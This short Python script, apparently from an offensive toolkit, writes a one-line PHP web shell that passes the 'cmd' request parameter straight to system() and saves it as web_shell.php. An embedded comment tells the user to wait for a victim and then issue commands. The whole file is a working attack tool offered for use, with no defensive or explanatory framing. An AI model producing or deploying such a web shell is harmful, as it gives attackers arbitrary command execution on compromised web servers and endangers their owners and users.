import os
from time import sleep
from termcolor import colored

def generate_payload():
    web_shell_code = """
<?php
/*
How to use this payload:
1) Run this file
2) Wait for connecting to victim
3) Write commands!)
*/
system($_GET['cmd']);
"""
    print(colored("[*] Generating web-shell payload...", "yellow"))
    sleep(1)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, "web_shell.php")
    with open(file_path, "w", encoding="utf-8") as web_shell:
        web_shell.write(web_shell_code)
        print(colored("[+] Payload was generated!", "green"))